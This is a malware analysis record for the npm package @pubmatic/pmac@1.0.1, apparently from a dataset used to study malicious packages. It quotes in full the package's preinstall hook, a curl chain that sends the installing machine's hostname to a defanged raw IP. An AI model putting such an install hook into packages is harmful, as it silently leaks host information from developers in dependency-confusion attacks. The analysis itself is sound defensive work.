# npm @pubmatic/pmac@1.0.1

**Source:** datadog · **Source label:** malicious · **Released:** 2025-02-20 (dataset) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package ships only a `package.json` whose `preinstall` hook runs `node index.js && curl ...?linux=`hostname` || curl "...?windows=%COMPUTERNAME%"`. Because `index.js` is not in the package, the node step always fails, the first curl is skipped and the second curl always runs. That sends an HTTP GET to 52.56.233[.]136:45010 carrying the computer name on Windows (cmd expands `%COMPUTERNAME%`) and the literal placeholder elsewhere. There are no gates: the `&&`/`||` chain is a fallback, not an environment check. Any environment with curl and outbound network to that host shows the behaviour.

## Execution

- **preinstall** `node index.js && curl hxxp://52[.]56[.]233[.]136:45010/?linux=`hostname` || curl "hxxp://52[.]56[.]233[.]136:45010/?windows=%COMPUTERNAME%"`: no package files; direct_script, inline_shell; errors hidden.

## Gates

None.

## Requirements

- network: 52[.]56[.]233[.]136:45010 (hostname beacon is sent by HTTP GET to this host)
- installed_tool: curl (hook command calls curl directly)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- Scoped name under a real ad-tech company's scope with an empty description: dependency-confusion recon probe.
- The prefilled `download_then_exec` launch style was removed; curl output is not executed.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "@pubmatic/pmac",
    "version": "1.0.1",
    "archive_sha256": "fdd04f05c27fbfea0c32ed0776e1977080e0049680c79d4c37a20756a1c961ae",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-02-20",
    "released_at_source": "dataset",
    "sample_path": "datadog/npm/malicious_intent/2025-02-20-@pubmatic_pmac-v1.0.1.zip",
    "package_root": "layer0/tmp/tmp9o79lgac/@pubmatic-pmac/package",
    "cluster_key": "de3a306c575dc8ceadff0a0e2d07f19d3138b5f406fcb9ea42b94f51434a7ac0",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "node index.js && curl hxxp://52[.]56[.]233[.]136:45010/?linux=`hostname` || curl \"hxxp://52[.]56[.]233[.]136:45010/?windows=%COMPUTERNAME%\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "node",
        "launch_style": [
          "direct_script",
          "inline_shell"
        ],
        "silent_failure": true
      }
    ],
    "delays": [],
    "notes": [
      "preinstall: 'index.js' is not a file in the package (only package.json is shipped), so 'node index.js' always fails and the '&&' skips the first curl.",
      "The '||' then always runs the second curl, so the hook's real effect is one HTTP GET to the raw IP carrying the machine name. Not a gate: an os-agnostic fallback chain, not a deliberate check.",
      "On Windows cmd %COMPUTERNAME% expands to the hostname; under sh (Linux/macOS) the literal text is sent, so there it is only an install beacon. The '||' hides the node failure (silent_failure).",
      "curl output is only printed, never executed, so the prefilled download_then_exec launch style was removed. Coverage: package.json read in full; no other files exist."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "52[.]56[.]233[.]136:45010",
      "reason": "hostname beacon is sent by HTTP GET to this host"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "hook command calls curl directly"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://52[.]56[.]233[.]136:45010/",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook sends the machine's hostname (on Windows) or a bare beacon (elsewhere) by curl to a raw IP on a high port, under a scoped name that looks like an internal company package. This is a dependency-confusion recon probe with no gates.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
